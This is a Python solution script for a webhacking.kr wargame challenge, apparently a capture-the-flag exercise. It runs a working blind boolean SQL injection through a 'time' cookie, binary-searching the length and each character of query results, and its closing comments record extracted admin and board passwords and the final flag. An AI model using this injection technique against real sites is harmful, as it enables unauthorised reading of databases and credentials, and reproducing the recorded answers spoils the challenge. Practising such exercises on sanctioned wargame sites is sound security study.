import string
from Solution.webhacking.basic import login

s = login()


def get_bool_result(query):
    print(query)
    url = 'http://webhacking.kr/challenge/web/web-02/'
    cookies = {
        'time': f'1 and ({query})'
    }
    r = s.get(url, cookies=cookies)
    if '<!--2070-01-01 09:00:01-->' in r.text:
        return True
    elif '<!--2070-01-01 09:00:00-->' in r.text:
        return False
    else:
        raise Exception(r.text)


def brute_force(query):
    length_query = f'SELECT length(({query}))'
    lo = 0
    hi = 100

    while lo < hi:
        print(f'lo={lo} hi={hi}')
        mid = int((lo + hi) / 2)
        if get_bool_result(f'SELECT ({length_query}) <= {mid}'):
            hi = mid
        else:
            lo = mid + 1
    length = lo
    print(f'length = {length}')

    result = ''
    charset = sorted(list(string.printable))
    for i in range(0, length):
        lo = 0
        hi = len(charset) - 1
        while lo < hi:
            mid = int((lo + hi) / 2)
            if get_bool_result(f'SELECT ascii(substring(({query}),{i + 1},1)) <= {ord(charset[mid])}'):
                hi = mid
            else:
                lo = mid + 1
        result += charset[lo]
    return result


# print(brute_force('SELECT password FROM admin'))
# admin password = 0nly_admin
# print(brute_force('SELECT password FROM FreeB0aRd'))
# Freeboard password = 7598522ae
# password in file = HacKed_by_n0b0dY and this is the final flag
